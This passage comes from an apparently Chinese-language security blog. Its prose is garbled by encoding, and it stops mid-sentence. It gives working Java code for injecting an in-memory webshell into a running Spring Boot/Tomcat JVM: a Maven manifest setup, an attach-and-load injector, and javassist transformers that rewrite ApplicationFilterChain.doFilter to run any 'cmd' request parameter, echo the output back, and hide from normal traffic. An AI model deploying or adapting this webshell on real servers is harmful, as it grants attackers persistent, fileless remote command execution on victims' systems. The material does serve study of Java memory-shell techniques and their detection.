class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--è‡ªåŠ¨æ·»åŠ META-INF/MANIFEST.MF --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br><span class="hljs-comment">&lt;!--                            &lt;Premain-Class&gt;org.example.Agent.premainAgent&lt;/Premain-Class&gt;--&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Agent-Class</span>&gt;</span>org.example.Agent.agentmainAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Agent-Class</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å†æ‰“åŒ…å°±æœ‰éœ€è¦çš„å±æ€§äº†</p><p><img src="https://cdn.clown2024.cn/image-20241031115458888.png" alt="image-20241031115458888"></p></blockquote><p>æœ€åç¼–å†™Agentçš„æ³¨å…¥ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><blockquote><p>ä¸è¿‡å¦‚æœæƒ³è¦ç”¨javassistæ¥ä¿®æ”¹çš„è¯ï¼Œç›®æ ‡ç±»ä¹Ÿéœ€è¦å¼•å…¥javassistä¾èµ–æ‰è¡Œï¼Œä¸ç„¶ä¼šæŠ¥é”™</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241031115558447.png" alt="image-20241031115558447"></p><h2 id="instrumentationçš„å±€é™"><a href="#Instrumentationçš„å±€é™" class="headerlink" title="Instrumentationçš„å±€é™"></a>Instrumentationçš„å±€é™</h2><p>premain å’Œ agentmain ä¸¤ç§æ–¹å¼<strong>ä¿®æ”¹å­—èŠ‚ç </strong>çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p><p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢ (Class Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰ <code>Instrumentation#redefineClasses</code> æ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p><ol><li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li><li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li><li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ </li><li>æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li><li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯ private static&#x2F;final ä¿®é¥°çš„</li><li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li></ol><h1 id="java-agentå®ç°spring-filterå†…å­˜é©¬"><a href="#Java-Agentå®ç°Spring-Filterå†…å­˜é©¬" class="headerlink" title="Java Agentå®ç°Spring Filterå†…å­˜é©¬"></a>Java Agentå®ç°Spring Filterå†…å­˜é©¬</h1><p>å› ä¸ºspringbootå†…ç½®äº†TomcatæœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°Filteré“¾ä¸­ä¸€å®šä¼šæ‰§è¡Œçš„æ–¹æ³•ï¼Œç„¶åé‡å†™ä»–å³å¯</p><p>ä»–çš„æµç¨‹ä¸ºApplicationFilterChain#doFilter&#x3D;&#x3D;ã€‹ApplicationFilterChain#internalDoFilter</p><p><img src="https://cdn.clown2024.cn/image-20241031170819582.png" alt="image-20241031170819582"></p><p><img src="https://cdn.clown2024.cn/image-20241031170835475.png" alt="image-20241031170835475"></p><p>è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½èƒ½å¤Ÿæ‹¿åˆ°ServletRequest å’Œ ServletResponseï¼Œè€Œä¸”hookä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡é€»è¾‘</p><p>æ‰€ä»¥æˆ‘ä»¬é‡å†™ApplicationFilterChain#internalDoFilteræˆ–è€…doFilteræ–¹æ³•æ¥æ‰“å…¥å†…å­˜é©¬å³å¯</p><h2 id="ç¼–å†™agentå†…å­˜é©¬"><a href="#ç¼–å†™agentå†…å­˜é©¬" class="headerlink" title="ç¼–å†™agentå†…å­˜é©¬"></a>ç¼–å†™agentå†…å­˜é©¬</h2><p>ç…§ä¾‹å…ˆå®ç°ä¸€ä¸ªClassFileTransformerï¼Œè¿™é‡Œçš„ServletRequestéœ€è¦æˆ‘ä»¬è‡ªå·±å»æºç çœ‹ä¸€ä¸‹å…·ä½“æ˜¯ä»€ä¹ˆç±»ï¼Œè¿™é‡Œæ˜¯jakarta.servlet.ServletRequest</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.ServletRequest request = $1\n;&quot;</span> + <span class="hljs-comment">//$1ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯requestè¯·æ±‚å®ä¾‹</span><br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>agentmain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        <span class="hljs-comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;<br>                <span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MFæ–‡ä»¶å°±å’Œå‰é¢ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å†å†™å‡ºæ¥äº†</p><p>æœ€åæ˜¯Injectç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        System.out.println(list);<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.dev.DevApplication&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;æˆåŠŸæ’å…¥agent&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå‘çš„ç‚¹ï¼Œå°±æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œæˆ‘ä»¬çš„javaagentçš„jaråŒ…å’Œinjectç±»éƒ½éœ€è¦æ˜¯ç¬¦åˆç›®æ ‡çš„jdkç‰ˆæœ¬çš„ï¼Œä¼°è®¡æ˜¯ä½ç‰ˆæœ¬ä¸èƒ½å‘é«˜ç‰ˆæœ¬æ³¨å…¥çš„é—®é¢˜</p><p>ç°åœ¨æˆ‘ä»¬å§springbootæœåŠ¡å¼€èµ·æ¥ï¼Œç„¶åå¯åŠ¨injectæ³¨å…¥agentå°±å¯ä»¥æ‰“å…¥å†…å­˜é©¬äº†</p><p><img src="https://cdn.clown2024.cn/image-20241031204330693.png" alt="image-20241031204330693"></p><p><img src="https://cdn.clown2024.cn/image-20241031204345365.png" alt="image-20241031204345365"></p><p>æˆ‘çœ‹æœ‰äº›æ–‡ç« å¯ä»¥å°†injectç±»å†™æˆjaråŒ…ï¼Œä¼ å…¥vmçš„pidå’Œagentçš„jaråŒ…å‚æ•°å°±èƒ½å‘½ä»¤è¡Œæ‰§è¡Œäº†ï¼Œä¸è¿‡éœ€è¦ç›¸å…³çš„å†…å­˜å·¥å…·æ¥è·å–pidæ‰è¡Œã€‚</p><h2 id="agentå†…å­˜é©¬å›æ˜¾é—®é¢˜"><a href="#agentå†…å­˜é©¬å›æ˜¾é—®é¢˜" class="headerlink" title="agentå†…å­˜é©¬å›æ˜¾é—®é¢˜"></a>agentå†…å­˜é©¬å›æ˜¾é—®é¢˜</h2><p>è¿™é‡Œçš„ç®€å•å†…å­˜é©¬ä¸å¸¦å›æ˜¾æ„Ÿè§‰ä¸æ–¹ä¾¿ï¼Œæˆ‘åˆå»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æœ‰å›æ˜¾çš„å†™æ³•ï¼ŒClassFileTransformerå°±å¯ä»¥æ”¹æˆä¸‹é¢è¿™æ ·</p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/">https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;internalDoFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“,å¸¦å›æ˜¾</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = $2.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;else&#123;internalDoFilter($1,$2);&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<span class="hljs-comment">//åœ¨æ–¹æ³•å‰æ’å…¥ä»£ç </span><br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>emmmä½†æ˜¯æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œä»–æ¯æ¬¡è¯·æ±‚å®Œå°±ä¼šå¡ä½ï¼Œç„¶åå°±æŠ¥ä¸‹é¢çš„é”™è¯¯ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241031215713085.png" alt="image-20241031215713085"></p><p>æ„æ€æ˜¯JVMåœ¨è¿è¡Œçš„æ—¶å€™æ‰¾ä¸åˆ°ç±»çš„å®šä¹‰ï¼Œè¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œç„¶åè¯•äº†å¾ˆå¤šå…¶ä»–çš„æ“ä½œå‘ç°éƒ½æ˜¯æŠ¥è¿™ä¸ªé”™è¯¯ï¼Œåªæœ‰å‰é¢é‚£ä¸ªç®€å•çš„å†…å­˜é©¬èƒ½é€šï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æˆ‘ç›´æ¥copyäº†ä»–çš„æ•´ä¸ªdoFilteræ–¹æ³•ä¹Ÿä¸è¡Œçº¢æ¸©äº†ğŸ˜¡</p><p>fuckæˆ‘æ”¹äº†ä¸€æ™šä¸Šç»ˆäºè¡Œäº†ï¼Œè¿™æ˜¯æˆåŠŸçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            String body=<span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletRequest req = $1;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletResponse res = $2;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = res.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;internalDoFilter(req, res);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;return null;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125; catch (java.lang.Exception pe) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœåªéœ€è¦æ¯”å‰é¢é‚£ä¸ªå¤šä¸€æ®µ**internalDoFilter(req, 